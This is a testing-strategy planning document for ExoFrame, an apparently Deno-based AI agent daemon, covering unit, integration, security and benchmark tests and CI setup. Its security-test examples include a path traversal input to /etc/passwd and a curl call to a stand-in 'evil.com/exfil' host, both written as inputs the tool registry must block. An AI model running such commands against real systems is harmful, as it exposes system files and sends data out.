# ExoFrame Testing Strategy

- **Version:** 1.0.0
- **Release Date:** 2025-11-30
- **Status:** Planning Document
- **Reference:** [Implementation Plan](./ExoFrame_Implementation_Plan.md) Phase 6

---

## 1. Overview

This document defines the testing strategy for ExoFrame, covering:

- Test types and their purposes
- v1.0 test scope and priorities
- Pre-release test execution requirements
- Test infrastructure and tooling

### Testing Philosophy

ExoFrame follows a **test pyramid** approach:

```
      ┌─────────────┐
      │   Manual    │  ← Pre-release QA
      │     QA      │     (10 scenarios)
     ─┴─────────────┴─
    ┌─────────────────┐
    │   Integration   │  ← Workflow tests
    │      Tests      │     (10 scenarios)
   ─┴─────────────────┴─
  ┌───────────────────────┐
  │      Unit Tests       │  ← Component tests
  │   (per module)        │     (target: 70% coverage)
 ─┴───────────────────────┴─
┌───────────────────────────┐
│     Mock Infrastructure   │  ← MockLLM, TestEnvironment
└───────────────────────────┘
```

### Key Principles

1. **Deterministic by default** — Tests use mock LLM, not real APIs
2. **Isolated** — Each test creates/destroys its own environment
3. **Fast** — Full suite completes in under 2 minutes
4. **CI-first** — All automated tests run on every PR

---

## 2. Test Categories

### 2.1 Unit Tests

**Purpose:** Verify individual components work correctly in isolation.

**Location:** `tests/` (flat structure with `cli/`, `docs/`, `obsidian/` subdirs)

**Coverage Target:** 70% for core modules

| Module                  | Test File                        | Priority | Status      |
| ----------------------- | -------------------------------- | -------- | ----------- |
| Config loader           | `tests/config_test.ts`           | P0       | ✅ Complete |
| Frontmatter/YAML parser | `tests/frontmatter_test.ts`      | P0       | ✅ Complete |
| Database service        | `tests/db_test.ts`               | P0       | ✅ Complete |
| File watcher            | `tests/watcher_test.ts`          | P1       | ✅ Complete |
| Context loader          | `tests/context_loader_test.ts`   | P1       | ✅ Complete |
| Git service             | `tests/git_service_test.ts`      | P1       | ✅ Complete |
| Agent runner            | `tests/agent_runner_test.ts`     | P1       | ✅ Complete |
| Execution loop          | `tests/execution_loop_test.ts`   | P1       | ✅ Complete |
| Mission reporter        | `tests/mission_reporter_test.ts` | P1       | ✅ Complete |
| Plan writer             | `tests/plan_writer_test.ts`      | P1       | ✅ Complete |
| Tool registry           | `tests/tool_registry_test.ts`    | P1       | ✅ Complete |
| Path resolver           | `tests/path_resolver_test.ts`    | P1       | ✅ Complete |
| Context card generator  | `tests/context_card_test.ts`     | P2       | ✅ Complete |
| Model adapter           | `tests/model_adapter_test.ts`    | P2       | ✅ Complete |
| CLI commands            | `tests/cli/*_test.ts`            | P2       | ✅ Complete |
| Obsidian integration    | `tests/obsidian/*_test.ts`       | P2       | ✅ Complete |

**Running Unit Tests:**

```bash
# Run all unit tests
deno task test

# Run with coverage collection (clears stale data automatically)
deno task test:coverage

# View coverage results (run after test:coverage)
deno task coverage        # Terminal summary (line/branch %)
deno task coverage:html   # HTML report → coverage/html/index.html
deno task coverage:lcov   # LCOV format → coverage/lcov.info (for CI)

# Run specific module
deno test --allow-all tests/config_test.ts

# Watch mode (re-runs on file changes)
deno task test:watch
```

**Note:** The coverage tasks filter to `src/` files only, excluding test files and
temporary directories created during daemon tests.

---

### 2.2 Integration Tests

**Purpose:** Verify complete workflows function correctly end-to-end.

**Location:** `tests/integration/`

**v1.0 Scenarios:**

| #  | Scenario                | Description                                 | Validates            | Status      |
| -- | ----------------------- | ------------------------------------------- | -------------------- | ----------- |
| 1  | **Happy Path**          | Request → Plan → Approve → Execute → Report | Core workflow        | ✅ Complete |
| 2  | **Plan Rejection**      | Request → Plan → Reject → Archive           | Rejection flow       | ✅ Complete |
| 3  | **Plan Revision**       | Request → Plan → Revise → New Plan          | Revision flow        | ✅ Complete |
| 4  | **Execution Failure**   | Approved plan fails during execution        | Error handling       | ✅ Complete |
| 5  | **Concurrent Requests** | Multiple requests processed simultaneously  | Race conditions      | ✅ Complete |
| 6  | **Context Overflow**    | Request references 50 large files           | Graceful truncation  | ✅ Complete |
| 7  | **Git Conflict**        | Agent and human edit same file              | Conflict detection   | ✅ Complete |
| 8  | **Daemon Restart**      | Daemon killed mid-execution                 | State recovery       | ✅ Complete |
| 9  | **Portal Access**       | Request accesses portal files               | Security enforcement | ✅ Complete |
| 10 | **Invalid Input**       | Malformed YAML frontmatter                  | Input validation     | ✅ Complete |

**Test Structure:**

```typescript
// tests/integration/happy_path_test.ts
Deno.test("Happy Path: Request to Report", async (t) => {
  const env = await TestEnvironment.create();

  await t.step("create request", async () => {
    await env.createRequest("Implement login feature");
    await env.waitForPlan();
  });

  await t.step("verify plan created", async () => {
    const plan = await env.getPlan();
    assertExists(plan);
    assertEquals(plan.status, "review");
  });

  await t.step("approve plan", async () => {
    await env.approvePlan();
    await env.waitForExecution();
  });

  await t.step("verify report created", async () => {
    const report = await env.getReport();
    assertExists(report);
    assertEquals(report.status, "completed");
  });

  await t.step("verify git branch", async () => {
    const branches = await env.getGitBranches();
    assert(branches.some((b) => b.includes("feat/")));
  });

  await env.cleanup();
});
```

**Running Integration Tests:**

```bash
# Run all integration tests
deno test tests/integration/

# Run specific scenario
deno test tests/integration/happy_path_test.ts

# Run with verbose output
deno test tests/integration/ --reporter=verbose
```

---

### 2.3 Security Tests

**Purpose:** Verify Deno permission enforcement and path security.

**Location:** Tests are distributed across relevant test files with `[security]` label for filtering.

**Running Security Tests:**

```bash
# Run all security tests
deno task test:security

# Or manually with filter
deno test --allow-all --filter "[security]" tests/
```

**Attack Scenarios & Coverage:**

| Attack Vector            | Test File                        | Test Count | Status      |
| ------------------------ | -------------------------------- | ---------- | ----------- |
| **Path Traversal**       | `tests/path_resolver_test.ts`    | 5 tests    | ✅ Complete |
| **Portal Escape**        | `tests/path_resolver_test.ts`    | 2 tests    | ✅ Complete |
| **File System Escape**   | `tests/tool_registry_test.ts`    | 6 tests    | ✅ Complete |
| **Shell Injection**      | `tests/tool_registry_test.ts`    | 4 tests    | ✅ Complete |
| **Network Exfiltration** | `tests/tool_registry_test.ts`    | 1 test     | ✅ Complete |
| **Env Variable Theft**   | `tests/config_test.ts`           | 4 tests    | ✅ Complete |
| **Cross-Portal Access**  | `tests/integration/09_*_test.ts` | 4 tests    | ✅ Complete |

**Total:** 29 security tests (filtered via `[security]` label)

**Test Implementation Examples:**

```typescript
// tests/tool_registry_test.ts
Deno.test("[security] ToolRegistry: read_file - blocks path traversal to /etc/passwd", async () => {
  const registry = new ToolRegistry({ config, db });
  const result = await registry.execute("read_file", {
    path: "../../../etc/passwd",
  });
  assertEquals(result.success, false, "Path traversal should be blocked");
});

Deno.test("[security] ToolRegistry: run_command - blocks curl/wget for data exfiltration", async () => {
  const registry = new ToolRegistry({ config, db });
  const result = await registry.execute("run_command", {
    command: "curl",
    args: ["https://evil.com/exfil"],
  });
  assertEquals(result.success, false, "curl should be blocked");
});

// tests/config_test.ts
Deno.test("[security] Env Variable Security: Verify sensitive env vars are not in config", () => {
  // Verifies API_KEY, AWS_SECRET_ACCESS_KEY, etc. are not exposed
});
```

**Deno Permission Model:**

The production daemon (`deno task start:fg`) runs with restricted permissions:

- `--allow-read=.` — Only workspace directory
- `--allow-write=.` — Only workspace directory
- `--allow-net=api.anthropic.com,api.openai.com,localhost:11434` — Only LLM APIs
- `--allow-env=EXO_,HOME,USER` — Only EXO_* vars and identity

---

### 2.5 Performance Benchmarks

**Purpose:** Establish baselines and detect regressions.

**Location:** `tests/benchmarks/`

**Metrics & Targets:**

| Metric              | Target             | Regression Threshold |
| ------------------- | ------------------ | -------------------- |
| **Cold Start**      | < 100ms            | +20%                 |
| **Watcher Latency** | < 200ms            | +20%                 |
| **Plan Generation** | < 5s (mock)        | +20%                 |
| **Database Query**  | < 10ms             | +50%                 |
| **Context Loading** | < 500ms (20 files) | +20%                 |

**Benchmark Implementation:**

```typescript
// tests/benchmarks/startup_bench.ts
Deno.bench("Cold start time", async () => {
  const cmd = new Deno.Command("deno", {
    args: ["run", "--allow-all", "src/main.ts", "--version"],
  });
  await cmd.output();
});

// tests/benchmarks/watcher_bench.ts
Deno.bench("File watcher latency", async () => {
  const watcher = new FileWatcher(testDir);
  await Deno.writeTextFile(`${testDir}/test.md`, "content");
  await watcher.waitForEvent();
});
```

**Running Benchmarks:**

```bash
# Run all benchmarks
deno bench tests/benchmarks/

# Compare against baseline
deno bench tests/benchmarks/ --json > current.json
deno run scripts/compare_benchmarks.ts --baseline=baseline.json --current=current.json
```

---

### 2.6 Documentation Tests

**Purpose:** Prevent documentation drift from code.

**Location:** `tests/docs/`

**Test Categories:**

| Category             | Validates                        | Example                              |
| -------------------- | -------------------------------- | ------------------------------------ |
| **Section Presence** | Required sections exist          | "Installation" in User Guide         |
| **CLI Coverage**     | All commands documented          | `exoctl plan approve` has entry      |
| **Link Validity**    | Internal links resolve           | `[Dashboard](./Dashboard.md)` exists |
| **Code Examples**    | Examples are syntactically valid | TypeScript blocks compile            |

**Running Documentation Tests:**

```bash
deno test tests/docs/
```

---

### 2.4 Manual QA

**Purpose:** Catch issues that automated tests miss.

**When:** Before each major release (v1.0, v1.1, v2.0, etc.)

**Platform Matrix:**

| Platform              | Environment         | Required |
| --------------------- | ------------------- | -------- |
| Ubuntu 24.04          | Fresh VM, no Deno   | ✓ v1.0   |
| macOS (Apple Silicon) | Clean user account  | ✓ v1.0   |
| Windows 11 + WSL2     | Ubuntu 22.04 in WSL | ✓ v1.0   |

**QA Scenarios:**

See [Manual Test Scenarios](./ExoFrame_Manual_Test_Scenarios.md) for detailed test scripts with step-by-step commands and expected results.

---

## 3. Test Infrastructure

### 3.1 Mock LLM Provider

**Purpose:** Enable deterministic testing without API calls or costs.

**Location:** `tests/mocks/mock_llm_provider.ts`

**Mock Strategies:**

| Strategy     | Use Case              | Implementation                   |
| ------------ | --------------------- | -------------------------------- |
| **Recorded** | Replay real responses | Hash prompt → lookup response    |
| **Scripted** | Predictable sequences | Return responses in order        |
| **Pattern**  | Dynamic responses     | Match prompt patterns → generate |
| **Failing**  | Error handling tests  | Always throw error               |
| **Slow**     | Timeout tests         | Add artificial delay             |

**Recording Real Responses:**

```bash
# Record LLM responses during manual testing
EXO_RECORD_LLM=true exoctl request "Test task"

# Responses saved to tests/fixtures/llm_responses/<hash>.json
```

**Fixture Format:**

```json
{
  "prompt_hash": "abc123...",
  "prompt_preview": "You are a senior developer...",
  "response": "## Proposed Plan\n\n1. First, I will...",
  "model": "claude-3-5-sonnet",
  "tokens": { "input": 1500, "output": 800 },
  "recorded_at": "2025-11-30T10:00:00Z"
}
```

**Usage in Tests:**

```typescript
import { MockLLMProvider } from "../mocks/mock_llm_provider.ts";

Deno.test("Plan generation uses correct format", async () => {
  const mockLLM = new MockLLMProvider("recorded");
  const runner = new AgentRunner(config, mockLLM);

  const plan = await runner.generatePlan(request);

  assertStringIncludes(plan, "## Proposed Plan");
});
```

---

### 3.2 Test Environment

**Purpose:** Isolated, reproducible test workspace.

**Location:** `tests/helpers/test_environment.ts`

**Features:**

- Creates temporary directory for each test
- Scaffolds complete ExoFrame workspace
- Provides helper methods for common operations
- Automatic cleanup on test completion

**Usage:**

```typescript
import { TestEnvironment } from "../helpers/test_environment.ts";

Deno.test("Example test", async () => {
  const env = await TestEnvironment.create();

  // Create files
  await env.createRequest("Test task");

  // Wait for daemon processing
  await env.waitForPlan();

  // Make assertions
  const plan = await env.getPlan();
  assertExists(plan);

  // Cleanup
  await env.cleanup();
});
```

**TestEnvironment API:**

| Method                       | Description                 |
| ---------------------------- | --------------------------- |
| `create()`                   | Initialize test environment |
| `cleanup()`                  | Remove temp directory       |
| `createRequest(description)` | Create request file         |
| `waitForPlan()`              | Wait for plan generation    |
| `getPlan()`                  | Read current plan           |
| `approvePlan()`              | Move plan to Active         |
| `waitForExecution()`         | Wait for execution complete |
| `getReport()`                | Read generated report       |
| `getGitBranches()`           | List git branches           |
| `getActivityLog()`           | Query Activity Journal      |

---

### 3.3 CI/CD Integration

**GitHub Actions Workflow:**

```yaml
# .github/workflows/test.yml
name: Test Suite

on: [push, pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: denoland/setup-deno@v1
        with:
          deno-version: v2.x

      - name: Run unit tests
        run: deno test --allow-all

      - name: Check coverage
        run: |
          deno test --coverage=cov_profile
          deno coverage cov_profile --lcov > coverage.lcov

      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: coverage.lcov

  integration-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: denoland/setup-deno@v1

      - name: Run integration tests
        run: deno test tests/integration/ --allow-all

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: denoland/setup-deno@v1

      - name: Run security tests
        run: deno test tests/security/ --allow-read=. --allow-run

  benchmarks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: denoland/setup-deno@v1

      - name: Run benchmarks
        run: deno bench tests/benchmarks/ --allow-all

      - name: Compare with baseline
        run: |
          deno bench tests/benchmarks/ --json > current.json
          deno run --allow-read scripts/compare_benchmarks.ts \
            --baseline=tests/benchmarks/baseline.json \
            --current=current.json \
            --threshold=20
```

---

## 4. Pre-Release Checklist

### 4.1 Automated Tests (Must Pass)

Before any release, all automated tests must pass:

```bash
# Run complete test suite
deno task test:all

# This runs:
# - deno test (unit tests)
# - deno test tests/integration/
# - deno test tests/security/
# - deno test tests/docs/
# - deno bench tests/benchmarks/
```

**CI Status:** All GitHub Actions workflows must be green.

---

### 4.2 Manual QA Scenarios

**Execute on each target platform before major releases.**

See **[Manual Test Scenarios](./ExoFrame_Manual_Test_Scenarios.md)** for detailed step-by-step instructions with exact commands and expected results.

**Scenario Summary (14 total):**

| ID    | Scenario                 | Category       |
| ----- | ------------------------ | -------------- |
| MT-01 | Fresh Installation       | Setup          |
| MT-02 | Daemon Startup           | Setup          |
| MT-03 | Create Request           | Core Workflow  |
| MT-04 | Plan Generation (Mock)   | Core Workflow  |
| MT-05 | Plan Approval            | Core Workflow  |
| MT-06 | Plan Rejection           | Core Workflow  |
| MT-07 | Plan Execution (Mock)    | Core Workflow  |
| MT-08 | Portal Management        | Features       |
| MT-09 | Daemon Crash Recovery    | Error Handling |
| MT-10 | Real LLM Integration     | Integration    |
| MT-11 | Invalid Request Handling | Error Handling |
| MT-12 | Database Corruption      | Error Handling |
| MT-13 | Concurrent Requests      | Reliability    |
| MT-14 | File Watcher Reliability | Reliability    |

**Minimum for v1.0 Release:** MT-01 through MT-12 must pass on Ubuntu 24.04.

---

### 4.3 Sign-off Template

Use the **QA Sign-off Template** in [Manual Test Scenarios](./ExoFrame_Manual_Test_Scenarios.md#qa-sign-off-template) for release sign-off.

The template includes:

- Checklist for all 14 manual test scenarios
- Pass/Fail/Skip tracking with notes
- Issue documentation section
- Final verdict (Approved/Blocked)

---

## 5. v1.0 Test Scope

### 5.1 In Scope (Must Have)

| Category                | Items                                                                | Status      |
| ----------------------- | -------------------------------------------------------------------- | ----------- |
| **Unit Tests**          | Config, Database, Watcher, Context Loader, Git Service + 12 more     | ✅ Complete |
| **Integration Tests**   | Scenarios 1-10 (all 10 scenarios implemented)                        | ✅ Complete |
| **Security Tests**      | Path traversal, Network exfil, Env theft, Shell injection (29 tests) | ✅ Complete |
| **Documentation Tests** | User Guide sections, CLI coverage                                    | ✅ Complete |
| **Manual QA**           | All 14 scenarios on Ubuntu (see Manual Test Scenarios doc)           | 🔲 Planned  |

### 5.2 In Scope (Should Have)

| Category                   | Items                       | Status     |
| -------------------------- | --------------------------- | ---------- |
| **Performance Benchmarks** | Cold start, Watcher latency | 🔲 Planned |
| **Manual QA**              | macOS, Windows WSL2         | 🔲 Planned |

### 5.3 Out of Scope (v1.1+)

| Category          | Items                         | Reason          |
| ----------------- | ----------------------------- | --------------- |
| **Flow Tests**    | Multi-agent orchestration     | Phase 7 feature |
| **Load Testing**  | Concurrent users, high volume | Single-user MVP |
| **Fuzzing**       | Random input generation       | Nice-to-have    |
| **Accessibility** | Screen reader, keyboard nav   | No UI in v1.0   |

---

## 6. Risk-to-Test Traceability

Every identified risk maps to at least one automated test:

| Risk ID   | Risk                           | Test File                              | Test Type |
| --------- | ------------------------------ | -------------------------------------- | --------- |
| T-PATH    | Path traversal attack          | `tests/security/permission_test.ts`    | Security  |
| T-LEASE   | Lease starvation (deadlock)    | `tests/leases/heartbeat_test.ts`       | Unit      |
| T-CONTEXT | Context overflow crashes agent | `tests/context/context_loader_test.ts` | Unit      |
| T-GIT     | Git identity drift             | `tests/git/git_service_test.ts`        | Unit      |
| T-WATCH   | Watcher misses file events     | `tests/watcher/stability_test.ts`      | Unit      |
| T-DOC     | Documentation outdated         | `tests/docs/user_guide_test.ts`        | Docs      |
| T-NET     | Unauthorized network access    | `tests/security/permission_test.ts`    | Security  |
| T-ENV     | Env variable theft             | `tests/security/permission_test.ts`    | Security  |

---

## 7. Test Maintenance

### 7.1 Adding New Tests

1. Create test file in appropriate directory (`tests/<category>/`)
2. Follow naming convention: `<feature>_test.ts`
3. Use `TestEnvironment` for integration tests
4. Use `MockLLMProvider` for any LLM interactions
5. Add to CI workflow if new category

### 7.2 Updating Fixtures

```bash
# Re-record LLM responses after prompt changes
EXO_RECORD_LLM=true deno task dry-run

# Update benchmark baselines after optimization
deno bench tests/benchmarks/ --json > tests/benchmarks/baseline.json
git add tests/benchmarks/baseline.json
git commit -m "chore: update benchmark baselines"
```

### 7.3 Flaky Test Policy

- Flaky tests are **bugs** — fix immediately or disable with `TODO`
- Use `Deno.test({ ignore: true }, ...)` for temporarily disabled tests
- Track disabled tests in GitHub issues
- No more than 3 disabled tests at any time

---

_End of Testing Strategy_
